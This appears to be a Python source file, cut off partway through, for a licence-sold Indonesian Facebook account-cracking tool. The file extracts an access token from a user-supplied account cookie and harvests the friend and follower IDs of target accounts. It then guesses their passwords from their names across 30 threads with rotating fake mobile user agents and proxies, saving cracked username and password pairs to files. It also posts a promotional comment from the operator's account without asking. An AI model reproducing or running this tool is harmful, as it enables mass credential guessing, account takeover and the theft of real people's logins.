###=============> [IMPORT-MODULE] <=============###
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.panel import Panel
from rich.console import Console
try:
        import rich
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• Sedang Menginstall Modul Requests •'))
	os.system('pip install requests && pip install mechanize ')

###===============> [UGENT-PROXY] <===============###
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
redmi=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('><')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/111.040.1511; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

for x in range(1000):
	rr = random.randint
	rc = random.choice
	A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
	B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
	S = f'Mozilla/5.0 (Linux; Android {str(rr(6,12))}; Nokia 6.1 {str(rr(4,10))} Build/QKQ1.'
	I = f'{str(rr(111111,199999))}.002; wv) AppleWebKit/537.36 '
	G = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
	X = f'/537.36 [FB_IAB/Orca-Android;FBAV/344.0.{str(rr(100,999))}.106;]'
	se = f'{A}{B}{C}{D}'
	xe = f'{S}{I}{G}{X}'
	op = random.choice([se,xe])
	if se in redmi:pass
	else:redmi.append(se)
	
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='10; SM-G970F)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/75.0.3396.81 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; U; Android 7.0; es-us;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi Note 4 Build/NRD90M)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2'
	uaku2=f'{aa} {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
USN = 'Mozilla/5.0 (Linux; U; Android 2.3.5; en-gb; HTC Desire HD A9191 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
	
###===============> [IMPORT-UAKU] <===============###
def uaku():
	try:
		ua=open('ua2.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Basari-ID/CRACK/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua2.txt','r').read().splitlines()

###================> [INDICATION] <================###
id,id2,loop,ok,cp,akun,oprek,method,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

###===============> [DAFTAR-WARNA] <===============###
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
linbas = random.choice([m,k,h,u,b])
kom1 = ("Anjayy keren banget bang🤘\n-\nhttps://www.facebook.com/100026979503245/posts/1141004856808820/?app=fbl\n-\n \nkomentar ditulis oleh bot\n \n[Script Lu Joss Bg @[100026979503245:] ]")

###=============> [KETERANGAN-WAKTU] <=============###
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

###==================> [JALAN] <==================###
def basari_tamvan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)

###=================> [CLEAR] <==================###
def clear():
	os.system('clear')

###==================> [BACK] <==================###
def back():
	login()
###===============> [CONSOLE] <=================###
def CetakBanner(ulfahsadiyah,asu):
    Console(width=100).print(Panel(ulfahsadiyah,style='bold blue'),justify='center')

def CetakLicensi(ulfahsadiyah,asu):
    Console(width=100).print(Panel(ulfahsadiyah,style='bold blue'),justify='center')

def ulfah(kaya,kontol):
    Console(width=100).print(Panel(kaya,style='bold blue'))

def whoami(kaya,kontol):
    Console(width=100).print(Panel(kaya,style='bold blue'),justify='center')

###================> [BANNER-MENU] <================###
def banner():
     CetakBanner('''
[bold cyan] _    _  _   _  _____    __    __  __  ____           ____    ____    _  _ 
[bold cyan]( \/\/ )( )_( )(  _  )  /__\  (  \/  )(_  _)   ___   ( ___)  (  _ \  ( \/ )
[bold cyan] )    (  ) _ (  )(_)(  /(__)\  )    (  _)(_   (___)   )__)    ) _ <   )  ( 
[bold cyan](__/\__)(_) (_)(_____)(__)(__)(_/\/\_)(____)         (__)    (____/  (_/\_)
''','color(8)')
###================> [BANNER-LOGIN] <================###
def banner2():
	CetakBanner('''
[bold cyan] __  __  ____  _  _  __  __     __    _____  ___  ____  _  _   
[bold cyan](  \/  )( ___)( \( )(  )(  )___(  )  (  _  )/ __)(_  _)( \( )  
[bold cyan] )    (  )__)  )  (  )(__)((___))(__  )(_)(( (_-. _)(_  )  (   
[bold cyan](_/\/\_)(____)(_)\_)(______)   (____)(_____)\___/(____)(_)\_)  
''','color(8)')
###===============> [BANNER-LICENSI] <===============###
def banner3():
	CetakBanner('''
[bold cyan] __    ____  ___  ____  _  _  ___  ____     _  _   
[bold cyan](  )  (_  _)/ __)( ___)( \( )/ __)(_  _)___( \/ )  
[bold cyan] )(__  _)(_( (__  )__)  )  ( \__ \ _)(_(___))  (   
[bold cyan](____)(____)\___)(____)(_)\_)(___/(____)   (_/\_)  
''','color(8)')
###=================> [MENU-LICENSI] <=================###
def xoshnaw(): 
  uuid = str(os.geteuid()) + str(os.getlogin())
  id =(uuid)
  os.system('clear');banner3()
  whoami(f'''[bold cyan]ID KAMU ADALAH [bold white]:[bold white] {id}''','color(8)')
  try:
    httpCaht = requests.get().text
    if id in httpCaht:
      whoami(f'''[bold green]HORE ID KAMU SUDAH AKTIF [🥳]''','color(8)')
      msg = str(os.geteuid())
      time.sleep(5)
      pass
    else:
      whoami(f'''[bold red]ID KAMU TIDAK AKTIF [😡]''','color(8)')
      whoami(f'''[bold yellow]SILAHKAN COPY ID DI ATAS KIRIM KE AUTHOR [📲]''','color(8)')
      whoami(f'''[bold green]Whatsapp[bold white] : [bold white] +6282316671302 [bold green][☎️]''','color(8)')
      os.system('xdg-open https://wa.me/+6282316671302?text=HAI+BANG+SIGA+🤩+SAYA+MAU+BELI+LICENSI+SCRIPT+CRACK+FB+BERAPA+HARGA+NYA+BANG+?')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
     print(logo)
     xoshnaw()
xoshnaw()
###=================> [MENU-LOGIN] <=================###
def login():
  try:
    token = open('.token.txt','r').read()
    cok = open('.cok.txt','r').read()
    tokenku.append(token)
    try:
      sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
      sy2 = json.loads(sy.text)['name']
      sy3 = json.loads(sy.text)['id']
      menu(sy2,sy3)
    except KeyError:
      login_lagi334()
    except requests.exceptions.ConnectionError:
      li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
      lo = mark(li, style='red')
      sol().print(lo, style='cyan')
      exit()
  except IOError:
    login_lagi334()
def login_lagi334():
  try:
    os.system('clear')
    banner3()
    #cetak(nel('\t©©© Your Cookies : [green]Cookiedough[white] ©©©'))
    ulfah('[bold white]masukan [bold green]cookies [bold white]akun tumbal facebook kamu [bold red]!!!','color(8)')
    asu = random.choice([m,k,h,b,u])
    cookie = input(f'  {B}╭──▸ {P}[{M}MASUKAN COOKIE{P}]\n  {B}╰──▸ {P}: {H}')
    headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
    'Cookie': cookie
    }
    url = requests.get('https://web.facebook.com/adsmanager?_rdc=1&_rdr', headers = headers)
    cari = re.findall('act=(.*?)&nav_source', url.text)
    if len(cari) == 0:
        Console(width=100).print(Panel("[bold red]cookie anda telah kadarluarsa/akun anda telah mati silakan ganti dengan akun tumbal lain",title='👿', style='bold blue'), justify="center");time.sleep(5);login_lagi334()
    else:
        for xenz in cari:
            web = requests.get(f'https://web.facebook.com/adsmanager/manage/campaigns?act={xenz}&nav_source=no_referrer', headers = headers)
            token = re.search('(EAAB\w+)', web.text).group(1)
            open(".token.txt","w").write(token)
            open(".cok.txt","w").write(cookie)
        urll = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+token, cookies={"cookie":cookie})
        json.loads(urll.text)["name"]
        json.loads(urll.text)["id"]
        Console(width=100).print(Panel("[bold green]LOGIN BERHASIL...SILAHKAN JALANKAN SC NYA ULANG", style='bold blue'), justify="center");time.sleep(5);exit()
  except Exception as e:
    os.system("rm -f .token.txt")
    os.system("rm -f .cok.txt")
    Console(width=100).print(Panel("[bold red]LOGIN GAGAL SILAHKAN GANTI AKUN TUMBAL ANDA !!!", style='bold blue'), justify="center");time.sleep(5);exit()
def bot():
  try:
    requests.post("https://graph.facebook.com/100043618273847?fields=subscribers&access_token=%s"%(tokenku))
  except:
    pass
		
###===============> [BOT-PAS] <===============###
def bot():
	try:
		requests.post(f"https://graph.facebook.com/1141004856808820/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
	except:
		pass
		
###=============> [BANGIAN-MENU] <=============###
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post(f"https://graph.facebook.com/1141004856808820/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
	except IOError:
		print('[×] Cookies Telah Kadaluarsa ')
		time.sleep(5)
		login_bas()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	ulfah(f'''[bold yellow]LINK SCRIPT    [bold white]: [bold green]https://github.com/XXX-SIGA/WHOAMI-FBX\n[bold yellow]STATUS SCRIPT  [bold white]: [bold green]PREMIUM\n[bold yellow]VERSION[bold white]        : [bold green]0.1''','color(8)')
	ulfah(f'''[green]ID Akun Tumbal Anda : [yellow]{str(my_id)}\n[green]Alamat IP Anda      : [yellow]{ip}\n[green]My_Github           : [yellow]XXX-SIGA\n[green]My_Facebook         : [yellow]Zeuz Toktok''','color(8)')
	ulfah(f''' [green][•] 1. [white]Crack Publik Massal\n [green][•] 2. [white]Crack Dari Followers\n [green][•] 3. [white]Crack Dari Group\n [green][•] 4. [white]Lihat Hasil Crack\n [green][•] 5. [white]Laporkan Bug\n [green][•] 0. [red]Keluar''','color(8)')
	basari_sayang_syafaa = input(f' {B}╭──▸{P}[PILIH MENU]\n {B}╰──▸: {H}')
	if basari_sayang_syafaa in ['1']:
		dump_massal()
	elif basari_sayang_syafaa in ['2']:
		dump_pengikut()
	elif basari_sayang_syafaa in ['3']:
		grup()
	elif basari_sayang_syafaa in ['4']:
		result()
	elif basari_sayang_syafaa in ['5']:
		authorbas()
	elif basari_sayang_syafaa in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		Console(width=100).print(Panel("[bold red]SUKSES MENGHAPUS COOKIE DAN LOGOUT [bold yellow]!!!", style='bold blue'), justify="center")
		exit()
	else:
		Console(width=100).print(Panel("[bold red]PILIH YANG BENAR LAH WOIII [bold yellow]!!!", style='bold blue'), justify="center")
		back()
def authorbas():
	Console(width=100).print(Panel("[bold magenta]SEBENTAR LAGI KAMU AKAN DI ARAHKAN KE WHATSAPP [bold yellow]!!!", style='bold blue'), justify="center")
	time.sleep(4)
	os.system("xdg-open https://wa.me/+6282316671302?text=HAI+SIGA+GANTENG+💥")
	back()
	
###===============> [HASIL-CRACK] <===============###
def result():
	ulfah(f''' [green][•] 1. [white]hasil [bold green]Ok[bold white] Anda\n [green][•] 2. [white]hasil [bold yellow]Cp[bold white] Anda\n [green][•] 3. [magenta]Kembali''','color(8)')
	baz_code = input(f' {B}╭──▸{P}[PILIH MENU]\n {B}╰──▸: {H}')
	if baz_code in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			Console(width=100).print(Panel("[bold red]FILE TIDAK DI TEMUKAN [bold yellow]!!!", style='bold blue'), justify="center")
			time.sleep(3)
			back()
		if len(vin)==0:
			Console(width=100).print(Panel("[bold red]TIDAK ADA HASIL [bold yellow]CP", style='bold blue'), justify="center")
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					ulfah(f'[yellow][!][white] %s. [yellow]%s [white]([magenta] %s [yellow]Akun [white])'%(nom,isi,len(hem)),'color(8)')
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f' {B}╭──▸{P}[PILIH NO FILE]\n {B}╰──▸: {H}')
			try:geh = lol[geeh]
			except KeyError:
				Console(width=100).print(Panel("[bold red]PILIH YANG BENAR LAH WOIII [bold yellow]!!!", style='bold blue'), justify="center")
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				Console(width=100).print(Panel("[bold red]FILE TIDAK DI TEMUKAN [bold yellow]!!!", style='bold blue'), justify="center")
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				ulfah(f'''[bold white] USERNAME : [bold yellow]{cpkuni[0]}\n[bold white] PASSWORD : [bold yellow]{cpkuni[1]}''','color(8)')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			Console(width=100).print(Panel("[bold red]FILE TIDAK DI TEMUKAN [bold yellow]!!!", style='bold blue'), justify="center")
			time.sleep(2)
			back()
		if len(vin)==0:
			Console(width=100).print(Panel("[bold red]TIDAK ADA HASIL [bold green]OK", style='bold blue'), justify="center")
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					ulfah(f'[green][!][white] %s. [green]%s [white]([blue] %s [green]Akun [white])'%(nom,isi,len(hem)),'color(8)')
				else:
					lol.update({str(cih):str(isi)})
					ulfah(f'[green][!][white] %s. [green]%s [white]([blue] %s [green]Id [white])'%(cih,isi,len(hem)),'color(8)')
			geeh = input(f' {B}╭──▸{P}[PILIH NO FILE]\n {B}╰──▸: {H}')
			try:geh = lol[geeh]
			except KeyError:
				Console(width=100).print(Panel("[bold red]PILIH YANG BENAR LAH TOLOL [bold yellow]!!!", style='bold blue'), justify="center")
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				Console(width=100).print(Panel("[bold red]FILE TIDAK DI TEMUKAN [bold yellow]!!!", style='bold blue'), justify="center")
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				ulfah(f'''[bold white] USERNAME : [bold green]{cpkuni[0]}\n[bold white] PASSWORD : [bold green]{cpkuni[1]}''','color(8)')
				nocp +=1
			print('')
			input(f'{x}[{b} Tekan Enter Untuk Kembali{x} ]')
			back()
	elif baz_code in ['3']:
		back()
	else:
		Console(width=100).print(Panel("[bold red]PILIH YANG BENAR LAH JANCOK [bold yellow]!!!", style='bold blue'), justify="center")
		back()
		
###===============> [DUMP-MASSAL] <===============###
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		ulfah(f'''[bold red] PASTIKAN ID NYA PUBLIK [bold yellow]!!!''','color(8)')
		baz_coder = int(input(f' {B}╭──▸{P}[MAU DUMP BERAPA ID]\n {B}╰──▸: {H}'))
	except ValueError:
		Console(width=100).print(Panel("[bold red]ISI YANG BENAR WOIII [bold yellow]!!!", style='bold blue'), justify="center")
		exit()
	if baz_coder<1 or baz_coder>100:
		Console(width=100).print(Panel("[bold red]GAGAL DUMP ID TARGET [bold yellow]!!!", style='bold blue'), justify="center")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(baz_coder):
		yz+=1
		kl = input(f' {B}[{P}Masukan ID Ke{B}]{H} '+str(yz)+' : ')
		uid.append(kl)
		ulfah(f'''[bold green]SEMOGA BERUNTUNG[bold yellow] :)''','color(8)')
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			Console(width=100).print(Panel("[bold red]KONEKSI INTERNET ANDA BERMASALAH [bold yellow]!!!", style='bold blue'), justify="center")
			exit()
	try:
		ulfah(f''' Total Id Target : {str(len(id))}''','color(8)')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		#print('[!] Koneksi Lu Eror Cuk ')
		Console(width=100).print(Panel("[bold red]KONEKSI INTERNET ERROR [bold yellow]!!!", style='bold blue'), justify="center")
		back()
	except (KeyError,IOError):
		#print(f'[!]{k} Pertemanan Id Target Lu Tidak Publik {x}')
		Console(width=100).print(Panel("[bold red]PERTEMANAN ID TARGET LU TIDAK PUBLIK [bold yellow]!!!", style='bold blue'), justify="center")
		time.sleep(3)
		back()
		
###===============> [DUMP-PENGIKUT] <===============###
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ulfah(f'''[bold red] PASTIKAN AKUN TARGET MEMILIKI PENGIKUT [bold yellow]!!!''','color(8)')
	baz_oi = input(f' {B}╭──▸{P}[MASUKAN ID TARGET]\n {B}╰──▸: {H}')
	try:
		baz_pero = requests.get('https://graph.facebook.com/'+baz_oi+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in baz_pero['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		ulfah(f''' Total Id Target : {str(len(id))}''','color(8)')
		setting()
	except requests.exceptions.ConnectionError:
		#print('[!] Koneksi Internet Bermasalah ')
		Console(width=100).print(Panel("[bold red]KONEKSI INTERNET ANDA BERMASALAH [bold yellow]!!!", style='bold blue'), justify="center")
		exit()
	except (KeyError,IOError):
		#print('[!] Gagal Mengambil Id Target ')
		Console(width=100).print(Panel("[bold red]GAGAL MENGAMBIL ID TARGET [bold yellow]!!!", style='bold blue'), justify="center")
		exit()
		
###===============> [DUMP-GRUP-FB] <===============###
def grup():
	Console(width=100).print(Panel("[bold yellow]MAAF FITUR INI DALAM TAHAP PERBAIKAN [bold red]!!!", style='bold blue'), justify="center")
	time.sleep(4)
	back()
			
###===============> [ID-SETTING] <===============###
def setting():
	ulfah(f''' [green][•] 1. [white]Crack Akun Old[blue]    ( [magenta]No[blue] )\n [green][•] 2. [white]Crack Akun New    [blue]( [yellow]Ya[blue] )\n [green][•] 3. [white]Crack Akun Random [blue]( [green]Yes [blue])''','color(8)')
	baz_gege = input(f' {B}╭──▸{P}[PILIH MENU]\n {B}╰──▸: {H}')
	if baz_gege in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif baz_gege in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif baz_gege in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		#print('[!] Pilih Yang Bener Cuukk')
		Console(width=100).print(Panel("[bold red]PILIH YANG BENAR WOIII", style='bold blue'), justify="left")
		exit()
		
###===============> [METHODE-LOGIN] <===============###
	ulfah(f''' [green][•] 1. [white]METODE V1 SLOW [blue]( [green]AXIS/XL/TRII [blue])\n [green][•] 2. [white]METODE V2 FAST[blue] ( [green]TELKOMSEL [blue])''','color(8)')
	basarifaa = input(f' {B}╭──▸{P}[PILIH METODE]\n {B}╰──▸: {H}')
	if basarifaa in ['1','01']:
		method.append('mobile')
	elif basarifaa in ['']:
		print('[!] Pilih Yang Bener Lah ')
		setting()
	elif basarifaa in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	ulfah(f'''[bold green]Saran Gua Pilih[bold yellow] T''','color(8)')
	_basnih_ = input(f' {B}╭──▸{P}[Tampilkan Aplikasi Y/T]\n {B}╰──▸: {H}')
	if _basnih_ in ['']:
		print('[!] Pilih Yang Bener Lah ')
		back()
	elif _basnih_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	ulfah(f'''[bold green]KALAU MAU CEPET PILIH[bold yellow] T [bold green]KALAU MAU LAMA PILIH [bold yellow]Y''','color(8)')
	pwplus=input(f' {B}╭──▸{P}[Masukan Kata Sandi Tambahan Y/T]\n {B}╰──▸: {H}')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		ulfah(f'''[bold green]Kata Sandi Tambahan Harus Memiliki[bold yellow] 6[bold green] Karakter Contoh [black]: [bold yellow]Katasandi,sayang,bismillah [red]DLL''','color(8)')
		pwku=input(f' {B}╭──▸{P}[Masukkan Sandi]\n {B}╰──▸: {H}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	
###===============> [DAFTAR-PASSWORD] <===============###
def passwrd():
	ulfah(f'''[white][•] [green]Hasil OK Tersimpan Di : {(okc)}\n[white][•] [yellow]Hasil CP Tersimpan Di : {(cpc)}''','color(8)')
	ulfah(f'''[bold red]HIDUP KAN MODE PESAWAT [bold green][ ✈️ ] [bold red]SELAMA 5 DETIK JIKA CRACK NYA TIDAK JALAN ATAU TIDAK ADA HASIL [bold yellow]!!!''','color(8)')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'111')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'1234')
					pwv.append(nmf+'123')
					pwv.append(nmf+'12345')
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'111')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackfree,idf,pwv)
	print('')
	print(f'[{b}•{x}]{h} HASIL OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} HASIL CP : {k}%s{x} '%(cp))
	print('')
		
###===============> [METHODE-V1] <===============###
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{B}[{bo}XXX-SIGA{B}] {B}[{P}{loop}{P}/{P}{len(id)}{B}] {B}[{P}OK {H}{ok}{P} CP {k}{cp}{x}{B}] [{bo}{'{:.0%}'.format(loop/float(len(id)))}{B}]{P}  "),
	sys.stdout.flush()
	ua = random.choice(redmi)
	ua3 = random.choice(['Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
	'Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900F Build/LRX21T) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-G900F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
	'Dalvik/2.1.0 (Linux; U; Android 5.1.1; F1 Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/Oppo;FBBD/Oppo;FBDV/F1;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]',
